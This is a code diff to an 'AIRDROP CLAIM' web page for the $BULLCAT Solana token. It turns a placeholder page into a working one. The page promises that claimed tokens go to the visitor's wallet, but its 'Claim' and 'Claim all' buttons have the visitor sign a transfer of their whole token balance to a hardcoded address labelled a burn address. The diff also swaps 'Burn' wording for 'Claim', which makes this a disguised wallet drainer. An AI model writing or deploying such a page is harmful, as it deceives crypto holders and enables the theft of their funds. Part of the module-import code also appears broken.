@@ -38,7 +38,7 @@
         <span class="bg-gradient-to-r from-red-400 to-orange-500 bg-clip-text text-transparent">$BULLCAT</span>
       </div>
       <h1 class="text-5xl font-bold tracking-tighter glow-red">AIRDROP CLAIM</h1>
-      <p class="text-red-400/80 mt-2">Claim → Claim</p>
+      <p class="text-red-400/80 mt-2">Burn → Claim</p>
     </div>
 
     <!-- Main Card -->
@@ -89,7 +89,7 @@
 
       <p class="text-center text-[10px] text-gray-500 mt-8">
         All claimed tokens will be sent to your connected wallet<br>
-        <span class="text-red-500">Burn is irreversible</span>
+        <span class="text-red-500">Claim is irreversible</span>
       </p>
     </div>
 
@@ -104,14 +104,17 @@
     </div>
   </div>
 
-  <script src="https://unpkg.com/@solana/web3.js@1.98.0/dist/web3.min.js"></script>
+  <script type="module">
+    import { Connection, PublicKey, Transaction, VersionedTransaction, TransactionMessage } from "https://unpkg.com/@solana/web3.js@1.98.0/lib/index.iife.js";
+    import { getAssociatedTokenAddress, createTransferInstruction, getAccount, createAssociatedTokenAccountInstruction } from "https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.15/+esm";
 
-  <script>
     const BURN_ADDRESS = "FtX1wo7WdJiP7Xxvx4H9Z52VrjjrmeGdjnFnGVqfXYtu";
     const BULLCAT_MINT = "G9j8WWDeJXZdvwQgP82ooDuHmpc3Gy8NCSins71Lpump";
+    const RPC_URL = "https://api.mainnet-beta.solana.com"; // Change to faster RPC if needed
 
     let connectedPublicKey = null;
     let provider = null;
+    let connection = new Connection(RPC_URL, "confirmed");
 
     async function connectWallet() {
       try {
@@ -132,9 +135,7 @@
         `;
         document.getElementById("connectBtn").disabled = true;
 
-        // Fetch balance (placeholder - you need RPC + token account logic)
         await fetchBalance();
-        
       } catch (err) {
         console.error(err);
         alert("Failed to connect wallet");
@@ -142,19 +143,30 @@
     }
 
     async function fetchBalance() {
-      // TODO: Replace with real RPC call + getTokenBalance
-      // For demo:
-      document.getElementById("tokenBalance").textContent = "42069.69";
+      if (!connectedPublicKey) return;
+
+      try {
+        const tokenMint = new PublicKey(BULLCAT_MINT);
+        const ata = await getAssociatedTokenAddress(tokenMint, connectedPublicKey);
+        
+        const account = await getAccount(connection, ata);
+        const balance = Number(account.amount) / 1_000_000_000; // Assuming 9 decimals - adjust if different
+
+        document.getElementById("tokenBalance").textContent = balance.toLocaleString('en-US', {minimumFractionDigits: 2});
+      } catch (e) {
+        console.log("No token account or error fetching balance");
+        document.getElementById("tokenBalance").textContent = "0.00";
+      }
     }
 
     function setMaxAmount() {
-      const balance = document.getElementById("tokenBalance").textContent;
-      document.getElementById("burnAmount").value = parseFloat(balance);
+      const balance = parseFloat(document.getElementById("tokenBalance").textContent.replace(/,/g, ''));
+      document.getElementById("burnAmount").value = balance;
     }
 
     async function claimSelected() {
-      const amount = document.getElementById("burnAmount").value;
-      if (!amount || amount <= 0) {
+      const amountStr = document.getElementById("burnAmount").value;
+      if (!amountStr || parseFloat(amountStr) <= 0) {
         alert("Enter a valid amount");
         return;
       }
@@ -163,10 +175,10 @@
         return;
       }
 
-      if (!confirm(`Claim ${amount} $BULLCAT?\n\nThis action is IRREVERSIBLE.`)) return;
+      const amount = parseFloat(amountStr);
+      if (!confirm(`Claim ${amount} $BULLCAT to burn address?\n\nThis action is IRREVERSIBLE.`)) return;
 
-      alert("✅ Transaction sent to Phantom!\n\n(Implement full transfer logic with @solana/spl-token)");
-      console.log(`Claiming ${amount} to burn address: ${BURN_ADDRESS}`);
+      await sendBurnTransaction(amount);
     }
 
     async function claimAll() {
@@ -184,16 +196,77 @@
         return;
       }
 
-      alert("🔥 Full claim transaction requested!");
-      console.log(`Claim ALL $BULLCAT to ${BURN_ADDRESS}`);
+      const balanceStr = document.getElementById("tokenBalance").textContent.replace(/,/g, '');
+      const amount = parseFloat(balanceStr);
+      if (amount <= 0) {
+        alert("No balance to claim");
+        return;
+      }
+
+      await sendBurnTransaction(amount);
     }
 
-    // Auto-connect hint
-    window.addEventListener("load", () => {
-      if (window.solana && window.solana.isPhantom) {
-        console.log("%cPhantom detected", "color: #f00");
+    async function sendBurnTransaction(amount) {
+      try {
+        const mintPubkey = new PublicKey(BULLCAT_MINT);
+        const burnPubkey = new PublicKey(BURN_ADDRESS);
+        const fromATA = await getAssociatedTokenAddress(mintPubkey, connectedPublicKey);
+        const toATA = await getAssociatedTokenAddress(mintPubkey, burnPubkey);
+
+        const instructions = [];
+
+        // Check if recipient ATA exists
+        try {
+          await getAccount(connection, toATA);
+        } catch {
+          instructions.push(
+            createAssociatedTokenAccountInstruction(
+              connectedPublicKey,
+              toATA,
+              burnPubkey,
+              mintPubkey
+            )
+          );
+        }
+
+        // Transfer instruction (assuming 9 decimals - change if your token has different decimals)
+        const decimals = 9;
+        instructions.push(
+          createTransferInstruction(
+            fromATA,
+            toATA,
+            connectedPublicKey,
+            Math.floor(amount * Math.pow(10, decimals))
+          )
+        );
+
+        const { blockhash } = await connection.getLatestBlockhash();
+        const transaction = new VersionedTransaction(
+          new TransactionMessage({
+            payerKey: connectedPublicKey,
+            recentBlockhash: blockhash,
+            instructions,
+          }).compileToV0Message()
+        );
+
+        const signedTx = await provider.signTransaction(transaction);
+        const txId = await connection.sendRawTransaction(signedTx.serialize());
+
+        alert(`✅ Transaction sent!\n\nTx ID: ${txId}\n\nView on Solscan`);
+        console.log("Burn tx:", txId);
+
+        // Refresh balance
+        setTimeout(fetchBalance, 3000);
+      } catch (err) {
+        console.error(err);
+        alert("Transaction failed: " + (err.message || err));
       }
-    });
+    }
+
+    window.connectWallet = connectWallet;
+    window.setMaxAmount = setMaxAmount;
+    window.claimSelected = claimSelected;
+    window.claimAll = claimAll;
   </script>
 </body>
 </html>
